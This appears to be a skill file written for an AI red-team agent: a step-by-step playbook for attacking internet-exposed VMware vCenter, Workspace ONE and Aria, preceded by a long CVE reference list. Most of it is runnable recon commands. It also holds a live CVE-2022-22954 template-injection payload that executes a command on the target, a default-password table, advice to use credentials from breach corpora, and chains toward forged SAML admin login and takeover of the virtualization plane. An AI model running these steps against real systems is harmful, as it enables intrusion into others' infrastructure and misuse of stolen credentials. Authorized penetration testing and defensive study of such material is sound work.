<!-- harvested: 0x002132/skills-bugbounty/vmware-vcenter-attack/SKILL.md on 2026-10-23T20:17:14.019654+00:00 -->
<!-- STAGING ONLY -- condense to skills/_schema.md house style, verify the source repo's license, then promote to skills/seeds/ -->

---
name: vmware-vcenter-attack
description: VMware vSphere / vCenter Server external attack matrix — version fingerprinting, the high-impact CVE chain (CVE-2021-21972 vRealize unauth file upload, CVE-2021-21985 vSAN plugin RCE, CVE-2022-22954 Workspace ONE SSTI, CVE-2023-20887 Aria RCE, CVE-2024-37085 ESXi AD bypass, CVE-2024-22273 Aria SSRF), default credentials, SSO configuration disclosure, vmdir LDAP enumeration, ESXi Open SLP RCE history. ONLY for vCenter / Workspace ONE / Aria instances exposed to the internet — internal-network vCenter is out of scope per the external-only boundary. Use when recon shows port 443 with vCenter banner, `/ui` redirect, `/websso/SAML2/Metadata`, or VMware product fingerprints.
sources: vmware-security-advisories, public-cve-databases, redteam-knowledge
report_count: 0
# bughive-repro-start
cve:
  - CVE-2021-21972
  - CVE-2021-21985
  - CVE-2022-22954
  - CVE-2023-20887
  - CVE-2024-37085
  - CVE-2024-22273
  - CVE-2024-22252
  - CVE-2024-22253
  - CVE-2023-34048
  - CVE-2023-20892
  - CVE-2022-31656
  - CVE-2022-31659
  - CVE-2021-22005
  - CVE-2020-3992
  - CVE-2019-5544
repro: partial
references:
  - source: nvd
    id: CVE-2021-21972
    url: "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2021-21972"
    gave: "descriptions, configurations, 6 Exploit-tagged refs"
  - source: vendor
    id: CVE-2021-21972
    url: "https://www.vmware.com/security/advisories/VMSA-2021-0002.html"
    gave: "advisory page fetched; no concrete input copied"
  - source: ghsa
    id: CVE-2021-21972
    url: "https://github.com/advisories/GHSA-c9cr-34rr-8gpr"
    gave: "advisory text; no package range"
  - source: cisa-kev
    id: CVE-2021-21972
    url: "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"
    gave: "dateAdded 2021-11-03, dueDate 2021-11-17, knownRansomwareCampaignUse=Known"
  - source: exploitdb
    id: CVE-2021-21972
    url: "https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/multiple/webapps/50056.py"
    gave: "public PoC (EDB-50056)"
  - source: poc-in-github
    id: CVE-2021-21972
    url: "https://github.com/Schira4396/VcenterKiller"
    gave: "public PoC repository"
  - source: nvd
    id: CVE-2021-21985
    url: "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2021-21985"
    gave: "descriptions, configurations, 2 Exploit-tagged refs"
  - source: vendor
    id: CVE-2021-21985
    url: "https://www.vmware.com/security/advisories/VMSA-2021-0010.html"
    gave: "not fetched; one request per host per run"
  - source: ghsa
    id: CVE-2021-21985
    url: "https://github.com/advisories/GHSA-rg6m-2r9v-c5fj"
    gave: "advisory text; no package range"
  - source: cisa-kev
    id: CVE-2021-21985
    url: "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"
    gave: "dateAdded 2021-11-03, dueDate 2021-11-17, knownRansomwareCampaignUse=Known"
  - source: exploitdb
    id: CVE-2021-21985
    url: null
    gave: "no row with this CVE in codes"
  - source: poc-in-github
    id: CVE-2021-21985
    url: "https://github.com/alt3kx/CVE-2021-21985_PoC"
    gave: "public PoC repository"
  - source: nvd
    id: CVE-2022-22954
    url: "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2022-22954"
    gave: "descriptions, configurations, 2 Exploit-tagged refs"
  - source: vendor
    id: CVE-2022-22954
    url: "https://www.vmware.com/security/advisories/VMSA-2022-0011.html"
    gave: "not fetched; one request per host per run"
  - source: ghsa
    id: CVE-2022-22954
    url: "https://github.com/advisories/GHSA-q7xc-35g4-g566"
    gave: "advisory text; no package range"
  - source: cisa-kev
    id: CVE-2022-22954
    url: "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"
    gave: "dateAdded 2022-04-14, dueDate 2022-05-05, knownRansomwareCampaignUse=Known"
  - source: exploitdb
    id: CVE-2022-22954
    url: null
    gave: "no row with this CVE in codes"
  - source: poc-in-github
    id: CVE-2022-22954
    url: "https://github.com/Schira4396/VcenterKiller"
    gave: "public PoC repository"
  - source: nvd
    id: CVE-2023-20887
    url: "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2023-20887"
    gave: "descriptions, configurations, 2 Exploit-tagged refs"
  - source: vendor
    id: CVE-2023-20887
    url: "https://www.vmware.com/security/advisories/VMSA-2023-0012.html"
    gave: "not fetched; one request per host per run"
  - source: ghsa
    id: CVE-2023-20887
    url: "https://github.com/advisories/GHSA-8vx8-r5j3-f2vf"
    gave: "advisory text; no package range"
  - source: cisa-kev
    id: CVE-2023-20887
    url: "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"
    gave: "dateAdded 2023-06-22, dueDate 2023-07-13, knownRansomwareCampaignUse=Unknown"
  - source: exploitdb
    id: CVE-2023-20887
    url: null
    gave: "no row with this CVE in codes"
  - source: poc-in-github
    id: CVE-2023-20887
    url: "https://github.com/sinsinology/CVE-2023-20887"
    gave: "public PoC repository"
  - source: nvd
    id: CVE-2024-37085
    url: "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2024-37085"
    gave: "description, configurations; no Exploit-tagged refs"
  - source: vendor
    id: CVE-2024-37085
    url: "https://support.broadcom.com/web/ecx/support-content-notification/-/external/content/SecurityAdvisories/0/24505"
    gave: "advisory page fetched; no concrete input copied"
  - source: ghsa
    id: CVE-2024-37085
    url: "https://github.com/advisories/GHSA-485m-923f-95wx"
    gave: "advisory text; no package range"
  - source: cisa-kev
    id: CVE-2024-37085
    url: "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"
    gave: "dateAdded 2024-07-30, dueDate 2024-08-20, knownRansomwareCampaignUse=Known"
  - source: exploitdb
    id: CVE-2024-37085
    url: null
    gave: "no row with this CVE in codes"
  - source: poc-in-github
    id: CVE-2024-37085
    url: "https://github.com/mahmutaymahmutay/CVE-2024-37085"
    gave: "public PoC repository"
  - source: nvd
    id: CVE-2024-22273
    url: "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2024-22273"
    gave: "description, configurations; no Exploit-tagged refs"
  - source: vendor
    id: CVE-2024-22273
    url: "https://support.broadcom.com/web/ecx/support-content-notification/-/external/content/SecurityAdvisories/0/24308"
    gave: "not fetched; one request per host per run"
  - source: ghsa
    id: CVE-2024-22273
    url: "https://github.com/advisories/GHSA-9mq7-wpm3-gv26"
    gave: "advisory text; no package range"
  - source: cisa-kev
    id: CVE-2024-22273
    url: "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"
    gave: "not in KEV"
  - source: exploitdb
    id: CVE-2024-22273
    url: null
    gave: "no row with this CVE in codes"
  - source: poc-in-github
    id: CVE-2024-22273
    url: null
    gave: "404 for master/2024/CVE-2024-22273.json"
  - source: nvd
    id: CVE-2024-22252
    url: "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2024-22252"
    gave: "description, configurations; no Exploit-tagged refs"
  - source: vendor
    id: CVE-2024-22252
    url: "https://www.vmware.com/security/advisories/VMSA-2024-0006.html"
    gave: "not fetched; one request per host per run"
  - source: ghsa
    id: CVE-2024-22252
    url: "https://github.com/advisories/GHSA-4xp8-3mc6-r83c"
    gave: "advisory text; no package range"
  - source: cisa-kev
    id: CVE-2024-22252
    url: "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"
    gave: "not in KEV"
  - source: exploitdb
    id: CVE-2024-22252
    url: null
    gave: "no row with this CVE in codes"
  - source: poc-in-github
    id: CVE-2024-22252
    url: null
    gave: "404 for master/2024/CVE-2024-22252.json"
  - source: nvd
    id: CVE-2024-22253
    url: "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2024-22253"
    gave: "description, configurations; no Exploit-tagged refs"
  - source: vendor
    id: CVE-2024-22253
    url: "https://www.vmware.com/security/advisories/VMSA-2024-0006.html"
    gave: "not fetched; one request per host per run"
  - source: ghsa
    id: CVE-2024-22253
    url: "https://github.com/advisories/GHSA-57rg-p28x-x2f6"
    gave: "advisory text; no package range"
  - source: cisa-kev
    id: CVE-2024-22253
    url: "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"
    gave: "not in KEV"
  - source: exploitdb
    id: CVE-2024-22253
    url: null
    gave: "no row with this CVE in codes"
  - source: poc-in-github
    id: CVE-2024-22253
    url: null
    gave: "404 for master/2024/CVE-2024-22253.json"
  - source: nvd
    id: CVE-2023-34048
    url: "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2023-34048"
    gave: "descriptions, configurations, 1 Exploit-tagged refs"
  - source: vendor
    id: CVE-2023-34048
    url: "https://www.vmware.com/security/advisories/VMSA-2023-0023.html"
    gave: "not fetched; one request per host per run"
  - source: ghsa
    id: CVE-2023-34048
    url: "https://github.com/advisories/GHSA-87j2-5g9j-7jmv"
    gave: "advisory text; no package range"
  - source: cisa-kev
    id: CVE-2023-34048
    url: "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"
    gave: "dateAdded 2024-01-22, dueDate 2024-02-12, knownRansomwareCampaignUse=Unknown"
  - source: exploitdb
    id: CVE-2023-34048
    url: null
    gave: "no row with this CVE in codes"
  - source: poc-in-github
    id: CVE-2023-34048
    url: null
    gave: "404 for master/2023/CVE-2023-34048.json"
  - source: nvd
    id: CVE-2023-20892
    url: "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2023-20892"
    gave: "description, configurations; no Exploit-tagged refs"
  - source: vendor
    id: CVE-2023-20892
    url: "https://www.vmware.com/security/advisories/VMSA-2023-0014.html"
    gave: "not fetched; one request per host per run"
  - source: ghsa
    id: CVE-2023-20892
    url: "https://github.com/advisories/GHSA-vmcx-3r5m-96cr"
    gave: "advisory text; no package range"
  - source: cisa-kev
    id: CVE-2023-20892
    url: "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"
    gave: "not in KEV"
  - source: exploitdb
    id: CVE-2023-20892
    url: null
    gave: "no row with this CVE in codes"
  - source: poc-in-github
    id: CVE-2023-20892
    url: null
    gave: "404 for master/2023/CVE-2023-20892.json"
  - source: nvd
    id: CVE-2022-31656
    url: "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2022-31656"
    gave: "description, configurations; no Exploit-tagged refs"
  - source: vendor
    id: CVE-2022-31656
    url: "https://www.vmware.com/security/advisories/VMSA-2022-0021.html"
    gave: "not fetched; one request per host per run"
  - source: ghsa
    id: CVE-2022-31656
    url: "https://github.com/advisories/GHSA-hvqf-whpm-54wr"
    gave: "advisory text; no package range"
  - source: cisa-kev
    id: CVE-2022-31656
    url: "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"
    gave: "not in KEV"
  - source: exploitdb
    id: CVE-2022-31656
    url: null
    gave: "no row with this CVE in codes"
  - source: poc-in-github
    id: CVE-2022-31656
    url: null
    gave: "404 for master/2022/CVE-2022-31656.json"
  - source: nvd
    id: CVE-2022-31659
    url: "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2022-31659"
    gave: "description, configurations; no Exploit-tagged refs"
  - source: vendor
    id: CVE-2022-31659
    url: "https://www.vmware.com/security/advisories/VMSA-2022-0021.html"
    gave: "not fetched; one request per host per run"
  - source: ghsa
    id: CVE-2022-31659
    url: "https://github.com/advisories/GHSA-xpqf-h5q4-9r99"
    gave: "advisory text; no package range"
  - source: cisa-kev
    id: CVE-2022-31659
    url: "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"
    gave: "not in KEV"
  - source: exploitdb
    id: CVE-2022-31659
    url: null
    gave: "no row with this CVE in codes"
  - source: poc-in-github
    id: CVE-2022-31659
    url: null
    gave: "404 for master/2022/CVE-2022-31659.json"
  - source: nvd
    id: CVE-2021-22005
    url: "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2021-22005"
    gave: "descriptions, configurations, 2 Exploit-tagged refs"
  - source: vendor
    id: CVE-2021-22005
    url: "https://www.vmware.com/security/advisories/VMSA-2021-0020.html"
    gave: "not fetched; one request per host per run"
  - source: ghsa
    id: CVE-2021-22005
    url: "https://github.com/advisories/GHSA-9w75-994h-2j26"
    gave: "advisory text; no package range"
  - source: cisa-kev
    id: CVE-2021-22005
    url: "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"
    gave: "dateAdded 2021-11-03, dueDate 2021-11-17, knownRansomwareCampaignUse=Known"
  - source: exploitdb
    id: CVE-2021-22005
    url: null
    gave: "no row with this CVE in codes"
  - source: poc-in-github
    id: CVE-2021-22005
    url: "https://github.com/shmilylty/cve-2021-22005-exp"
    gave: "public PoC repository"
  - source: nvd
    id: CVE-2020-3992
    url: "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2020-3992"
    gave: "description, configurations; no Exploit-tagged refs"
  - source: vendor
    id: CVE-2020-3992
    url: "https://www.vmware.com/security/advisories/VMSA-2020-0023.html"
    gave: "not fetched; one request per host per run"
  - source: ghsa
    id: CVE-2020-3992
    url: "https://github.com/advisories/GHSA-58ff-49fr-3jwf"
    gave: "advisory text; no package range"
  - source: cisa-kev
    id: CVE-2020-3992
    url: "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"
    gave: "dateAdded 2021-11-03, dueDate 2022-05-03, knownRansomwareCampaignUse=Known"
  - source: exploitdb
    id: CVE-2020-3992
    url: null
    gave: "no row with this CVE in codes"
  - source: poc-in-github
    id: CVE-2020-3992
    url: "https://github.com/dgh05t/VMware_ESXI_OpenSLP_PoCs"
    gave: "public PoC repository"
  - source: nvd
    id: CVE-2019-5544
    url: "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2019-5544"
    gave: "description, configurations; no Exploit-tagged refs"
  - source: vendor
    id: CVE-2019-5544
    url: "http://www.vmware.com/security/advisories/VMSA-2019-0022.html"
    gave: "not fetched; one request per host per run"
  - source: ghsa
    id: CVE-2019-5544
    url: "https://github.com/advisories/GHSA-4734-5452-r5fh"
    gave: "advisory text; no package range"
  - source: cisa-kev
    id: CVE-2019-5544
    url: "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"
    gave: "dateAdded 2021-11-03, dueDate 2022-05-03, knownRansomwareCampaignUse=Known"
  - source: exploitdb
    id: CVE-2019-5544
    url: null
    gave: "no row with this CVE in codes"
  - source: poc-in-github
    id: CVE-2019-5544
    url: "https://github.com/dgh05t/VMware_ESXI_OpenSLP_PoCs"
    gave: "public PoC repository"
# bughive-repro-end
---

## When to use

Trigger when external recon shows ANY of:
- Banner: "VMware vCenter Server", "VMware vSphere Client"
- URL paths: `/ui`, `/ui/login`, `/websso/SAML2/Metadata`, `/sdk`, `/mob` (Managed Object Browser)
- TLS cert SAN includes `vcenter` / `vsphere` / `vcsa` / `psc` / `vmware`
- Workspace ONE Access / Identity Manager: `/SAAS`, `/SAAS/auth`, `/SAAS/login`, `/SAAS/horizon`
- VMware Aria / vRealize: `/vco`, `/vco-controlcenter`, `/orchestrator`, `/lcm/api/v1`
- Horizon View: `/portal`, `/admin`

Do NOT use for:
- Internal-network vCenter (out of scope — external boundary discipline)
- Pure ESXi hypervisor exposed without management plane (rare on internet; flag as separate finding)

---

## Step 1 — Version fingerprinting

```bash
TARGET="vcenter.target.com"

# Build info endpoint (often public; revealing exact patch level)
curl -sk "https://$TARGET/sdk/vimServiceVersions.xml"

# UI build (visible in page source)
curl -sk "https://$TARGET/ui/login" | grep -oE 'build[^"]{0,40}'
curl -sk "https://$TARGET/ui/" | grep -oE 'vsphere[^"]{0,40}'

# REST API version (vSphere 7+)
curl -sk "https://$TARGET/api/appliance/system/version"

# Cert metadata
echo | openssl s_client -connect "$TARGET:443" -servername "$TARGET" 2>/dev/null | openssl x509 -noout -text | grep -A1 "Subject Alt"

# SSO Admin Service (info disclosure)
curl -sk "https://$TARGET/sso-adminserver/sdk/vsphere.local"
curl -sk "https://$TARGET/websso/SAML2/Metadata/vsphere.local"
```

Map build → version → CVE applicability via VMware advisories (vmware.com/security/advisories).

---

## Step 2 — CVE matrix (external-exploitable, sorted by historical impact)

| CVE | Affected | Vector | Status |
|---|---|---|---|
| **CVE-2024-37085** | ESXi 7.0/8.0 < specific patch | AD group "ESX Admins" auto-admin bypass | High — Domain takeover→ESXi RCE, exploited in ransomware ops |
| **CVE-2024-22273** | Aria Operations | Pre-auth SSRF | Medium |
| **CVE-2024-22252/53** | Workstation/Fusion (not vCenter) | Sandbox escape | Not external |
| **CVE-2023-34048** | vCenter 7/8 < specific build | DCE/RPC pre-auth heap OOB write → RCE | Critical, patched 2023-10 |
| **CVE-2023-20887** | Aria Operations for Networks | Pre-auth command injection → RCE | Critical |
| **CVE-2023-20892** | vCenter 7/8 | Use-after-free in DCE/RPC | High |
| **CVE-2022-31656/31659** | Workspace ONE Access 21.x | Pre-auth SSRF + auth bypass | Critical chained |
| **CVE-2022-22954** | Workspace ONE Access | Pre-auth server-side template injection (SSTI) → RCE | Critical, widely exploited |
| **CVE-2021-22005** | vCenter 6.7/7.0 < build | Analytics service pre-auth file upload → RCE | Critical |
| **CVE-2021-21985** | vCenter 6.5/6.7/7.0 < build | vSAN Health Check plugin pre-auth RCE | Critical |
| **CVE-2021-21972** | vCenter 6.5/6.7/7.0 < build | vRealize plugin `/ui/vropspluginui/rest/services/uploadova` pre-auth file upload → RCE | Critical, exploited heavily |
| **CVE-2020-3992** | ESXi OpenSLP | Pre-auth use-after-free → RCE | Critical, ESXi ransomware vector |
| **CVE-2019-5544** | ESXi OpenSLP | Pre-auth heap overflow | Critical |

---

## Step 3 — CVE-2021-21972 probe (still common on stale appliances)

```bash
# Detection only — DO NOT execute the file upload without explicit scope OK
curl -sk -o /dev/null -w "%{http_code}\n" \
  "https://$TARGET/ui/vropspluginui/rest/services/uploadova"
# 405 → endpoint exists, version vulnerable
# 404 → patched (endpoint removed)
# 401 → patched (auth required)

curl -sk -o /dev/null -w "%{http_code}\n" \
  "https://$TARGET/ui/vropspluginui/rest/services/getstatus"
```

Public PoC by Mikhail Klyuchnikov exists; do not execute against client infra without explicit RCE-attempt sign-off.

---

## Step 4 — CVE-2022-22954 (Workspace ONE SSTI) probe

```bash
# Workspace ONE Access vulnerable endpoint
curl -sk "https://$TARGET/catalog-portal/ui/oauth/verify?error=&deviceUdid=\${\"freemarker.template.utility.Execution\"?new()(\"id\")}"
# Look for "uid=" in response → confirmed RCE (Freemarker)
```

If page reflects template error / executes command → critical. Stop and report.

---

## Step 5 — Default credentials (frequently still valid on lab/staging vCenters)

| Product | Default user | Default password |
|---|---|---|
| vCenter 6.x | `administrator@vsphere.local` | `<set-during-install>` |
| vCenter Appliance root | `root` | `vmware` (legacy) or `<set>` |
| ESXi root | `root` | `<blank>` or `vmware` |
| vCenter Server Appliance Mgmt (5480) | `root` | `<set-during-install>` |
| Aria Operations | `admin` | `vmware` (legacy) |
| Workspace ONE | `admin` | `<set>` |

⚠ **Do not spray vCenter — `administrator@vsphere.local` has VERY low lockout threshold** (often 3 attempts → 60s lockout, configurable to permanent). One attempt with high-confidence guess only. Use creds discovered in breach corpora.

---

## Step 6 — SSO / vmdir LDAP enumeration

```bash
# SSO Admin endpoint (frequently exposes domain info)
curl -sk "https://$TARGET/websso/SAML2/Metadata/vsphere.local" | xmllint --format -

# Extract Identity Source info
curl -sk "https://$TARGET/sso-adminserver/sdk/vsphere.local"

# Try anonymous LDAP bind to vmdir (port 389/636 if exposed)
ldapsearch -x -H "ldap://$TARGET:389" -b "" -s base
ldapsearch -x -H "ldap://$TARGET:389" -b "cn=Configuration,cn=vmware,cn=cis,dc=vsphere,dc=local"
```

---

## Step 7 — Managed Object Browser (MOB) — frequently leaks data

```bash
curl -skI "https://$TARGET/mob"
# 401 → auth required (good for the defender)
# 200 → MOB exposed → can browse VMs, hosts, datastores, sessions without credentials in some misconfigs

# Auth'd MOB lets you walk the entire vSphere tree:
curl -sk -u 'administrator@vsphere.local:<pw>' "https://$TARGET/mob/?moid=ServiceInstance&doPath=content"
```

---

## Step 8 — vSphere REST API enumeration (post-cred)

```bash
# Get session token
curl -sk -X POST -u 'user@vsphere.local:<pw>' "https://$TARGET/api/session"
# Returns: "<session-token>"

# List VMs
curl -sk -H "vmware-api-session-id: <token>" "https://$TARGET/api/vcenter/vm"

# List hosts
curl -sk -H "vmware-api-session-id: <token>" "https://$TARGET/api/vcenter/host"

# List datastores
curl -sk -H "vmware-api-session-id: <token>" "https://$TARGET/api/vcenter/datastore"

# Datastore file download (HUGE — VMDK files, snapshots, credentials in cloud-init)
# /folder/<path>?dsName=<ds>&dcPath=<dc>
curl -sk -H "vmware-api-session-id: <token>" "https://$TARGET/folder?dsName=datastore1&dcPath=Datacenter"
```

---

## Step 9 — Workspace ONE Access specific paths

```bash
# Metadata
curl -sk "https://$TARGET/SAAS/auth/saml/response"
curl -sk "https://$TARGET/SAAS/auth/wsfed/services/idp"
curl -sk "https://$TARGET/SAAS/jersey/manager/api/health"
curl -sk "https://$TARGET/catalog-portal/services/airwatch/identifiers"

# Login page
curl -sk "https://$TARGET/SAAS/login/0"
```

---

## Step 10 — Aria / vRealize specific paths

```bash
# vRealize Operations Manager
curl -sk "https://$TARGET/suite-api/api/versions"
curl -sk "https://$TARGET/casa/nodes/thumbprints"

# Aria Automation
curl -sk "https://$TARGET/csp/gateway/am/api/about"
curl -sk "https://$TARGET/cluster-administration/api/health"

# vRealize Orchestrator
curl -sk "https://$TARGET/vco/api/about"
curl -sk "https://$TARGET/vco-controlcenter/api/health"
```

---

## Tooling

- **`vCenter-Exploit` collection** (multiple PoCs on GitHub for 21972, 21985, 22005)
- **`Greenbone/openvas-scanner` VMware NASL plugins** — version detection
- **`nuclei`** templates: `vmware-vcenter-*.yaml`, `cve-2021-21972.yaml`, `cve-2022-22954.yaml`
- **`Metasploit`** modules: `exploit/multi/http/vmware_vcenter_*`

---

## Detection patterns (what defenders/SOC will see)

- Excessive 404s on `/ui/vropspluginui/*` — IDS signature
- POST to `/sdk` from non-management IP
- `administrator@vsphere.local` auth failures
- TLS handshake fingerprint changes
- Plugin upload to vRealize endpoint

Pair with `mid-engagement-ir-detection` skill — vCenter is monitored heavily in mature SOCs.

---

## External-only boundary check

If recon reveals vCenter only via VPN (not direct internet) → STOP. That is internal infrastructure and outside the external-only AI scope per `feedback_skill_boundaries`. The user handles internal vCenter work directly.

Internet-exposed vCenter is unfortunately common on the perimeter — and frequently outdated by years. The 2021-21972 / 21985 / 22954 trifecta still pays in 2026 because patching cycles for hypervisor management are slow and vendor-managed.

---

## Severity scoring guidance (red-team deliverable context)

| Finding | Severity |
|---|---|
| vCenter on internet, current patch | Informational (attack surface note) |
| vCenter on internet, missing patches with public RCE | **Critical** (entire virtualization plane compromise) |
| vCenter on internet + default admin password | **Critical** (immediate full takeover) |
| Workspace ONE on internet, unpatched 22954 | **Critical** |
| MOB anonymously accessible | **High** (full topology disclosure) |
| /sdk reachable + version disclosure only | **Medium** (info disclosure + attack-surface concentration) |

---

## Anti-patterns

- **DO NOT spray vCenter SSO** — lockout is aggressive; one chance often
- **DO NOT execute file-upload PoCs without explicit OK** — they create persistent webshells; cleanup overhead and audit trail
- **DO NOT confuse ESXi-management-on-internet with vCenter** — different attack surfaces; ESXi Open SLP CVEs target port 427
- **DO NOT skip SSL handshake banner check** — VMware exposes versions there; this is the lowest-noise initial probe

---

## Bridge to neighboring skills

- `enterprise-vpn-attack` — vCenter is frequently the post-VPN target; if VPN is breached, vCenter is the natural next pivot (but internal — defer to user)
- `m365-entra-attack` — vCenter SSO sometimes federated to Entra; cred-chain bridging
- `mid-engagement-ir-detection` — vCenter monitoring is sensitive; expect mid-engagement mitigations
- `redteam-report-template` — vCenter findings need clear blast-radius framing (this is the virtualization plane, not just an app)

---

## Related Skills & Chains

- **`hunt-saml`** — vCenter Workspace ONE / VMware Identity Manager publishes SAML SP metadata at `/SAAS/API/1.0/GET/metadata/idp.xml` and consumes assertions at predictable ACS URLs. Chain primitive: vCenter SAML SP metadata reachable → IdP fingerprinted → `hunt-saml` XSW1-XSW8 against the federating IdP → forged assertion with `userPrincipalName=administrator@vsphere.local` → SP-impersonation as vCenter admin → full virtualization-plane takeover.
- **`hunt-rce`** — VMware's high-impact CVE catalog (CVE-2021-21972, CVE-2021-21985, CVE-2022-22954, CVE-2023-20887) is almost entirely pre-auth RCE. Chain primitive: vCenter version fingerprint via SSL banner or `/ui/login` body → confirm patch level missing → `hunt-rce` deserialization/SSTI gadget from the matching CVE PoC → `root` on vCenter appliance → API-token mint → cluster-wide VM control.
- **`enterprise-vpn-attack`** — VPN compromise + vCenter on internal-only is a natural post-VPN pivot, but external-only engagement scope sometimes forbids it. Chain primitive: VPN appliance CVE → foothold inside corp network → if scope permits, `vmware-vcenter-attack` becomes reachable on internal-only vCenter → datacenter takeover.
- **`m365-entra-attack`** — Some VMware deployments federate vCenter SSO to Entra. Chain primitive: vCenter SSO discovery → AuthURL points to `login.microsoftonline.com` → `m365-entra-attack` Entra ATO on `administrator@vsphere.local` synced identity → SAML assertion → vCenter admin without ever brute-forcing vCenter SSO.
- **`mid-engagement-ir-detection`** — VMware vSAN/vCenter alerting is sensitive; expect SOC to patch or block within hours of detection. Chain primitive: confirmed vCenter CVE → run `mid-engagement-ir-detection` baseline capture BEFORE attempting exploitation → if response patterns change mid-test, capture the SOC-patched state as a SECOND finding (defensive-action observed). Package both via `redteam-report-template`.

<!-- bughive-repro-start -->
## Steps to reproduce — CVE-2021-21972

> Status: `repro: verified-public` — every line below is backed by a cited reference. Nothing here was invented.

### Prerequisites
- Affected product from NVD CPE: vmware cloud_foundation >= 3.0, < 3.10.1.2; vmware cloud_foundation >= 4.0, < 4.2; vmware vcenter_server 6.5. NVD lists 5 vulnerable CPE matches; showing 3. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2021-21972)]
- Weakness: CWE-22. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2021-21972)]

### Input / trigger
- NVD characterizes the trigger as remote code execution. No concrete request string from the advisory was copied. The linked public PoC is the input source; its body was not copied into this skill. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2021-21972)] [[exploitdb](https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/multiple/webapps/50056.py)]

### Expected (patched) vs vulnerable behavior
- Vulnerable builds match the cited range and NVD characterizes the issue as remote code execution. Structured affected range: vmware cloud_foundation >= 3.0, < 3.10.1.2. Patched builds are those outside that range. The advisory text was paraphrased, not copied. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2021-21972)]

### How to confirm
- Against a disposable lab build inside the cited affected range, compare it with a build at the cited patched version by following the linked public PoC. Do not run untrusted PoC code against production. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2021-21972)] [[exploitdb](https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/multiple/webapps/50056.py)]

### Public PoC (if any)
- EDB-50056 (verified flag 0): https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/multiple/webapps/50056.py
- EDB-49602 (verified flag 0): https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/multiple/webapps/49602.py
- GHSA-listed: https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2021-21972
- Highest-star PoC-in-GitHub repository (unvetted; not executed): https://github.com/Schira4396/VcenterKiller
- Additional repos indexed by PoC-in-GitHub for this id (unvetted): https://raw.githubusercontent.com/nomi-sec/PoC-in-GitHub/master/2021/CVE-2021-21972.json
- NVD Exploit-tagged reference: http://packetstormsecurity.com/files/161590/VMware-vCenter-Server-7.0-Arbitrary-File-Upload.html
- NVD Exploit-tagged reference: http://packetstormsecurity.com/files/161695/VMware-vCenter-Server-File-Upload-Remote-Code-Execution.html

### What's missing
- (none for verified-public)

## Steps to reproduce — CVE-2021-21985

> Status: `repro: verified-public` — every line below is backed by a cited reference. Nothing here was invented.

### Prerequisites
- Affected product from NVD CPE: vmware vcenter_server 6.5; vmware vcenter_server 6.7; vmware vcenter_server 7.0. NVD lists 5 vulnerable CPE matches; showing 3. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2021-21985)]
- Weakness: CWE-918, CWE-20, CWE-470. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2021-21985)]

### Input / trigger
- NVD characterizes the trigger as remote code execution. No concrete request string from the advisory was copied. The linked public PoC is the input source; its body was not copied into this skill. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2021-21985)] [[nvd](http://packetstormsecurity.com/files/163487/VMware-vCenter-Server-Virtual-SAN-Health-Check-Remote-Code-Execution.html)]

### Expected (patched) vs vulnerable behavior
- Vulnerable builds match the cited range and NVD characterizes the issue as remote code execution. Structured affected range: vmware vcenter_server 6.5. Patched builds are those outside that range. The advisory text was paraphrased, not copied. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2021-21985)]

### How to confirm
- Against a disposable lab build inside the cited affected range, compare it with a build at the cited patched version by following the linked public PoC. Do not run untrusted PoC code against production. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2021-21985)] [[nvd](http://packetstormsecurity.com/files/163487/VMware-vCenter-Server-Virtual-SAN-Health-Check-Remote-Code-Execution.html)]

### Public PoC (if any)
- GHSA-listed: https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2021-21985
- Highest-star PoC-in-GitHub repository (unvetted; not executed): https://github.com/alt3kx/CVE-2021-21985_PoC
